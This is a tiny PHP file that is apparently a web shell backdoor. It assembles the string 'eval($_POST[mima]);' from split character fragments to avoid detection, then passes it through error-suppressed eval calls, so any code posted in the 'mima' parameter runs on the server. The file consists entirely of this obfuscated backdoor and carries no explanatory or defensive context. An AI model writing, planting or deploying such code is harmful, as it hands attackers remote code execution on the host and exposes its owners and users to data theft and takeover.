<?php
$s0="e";
$s1="val($";
$s2="_";
$s3="P";
$s4="O";
$s5="ST";


$poos=$s0.$s1.$s2.$s3.$s4.$s5."[mima]);";
$pp=@eval($poos);
@eval($pp);
?>
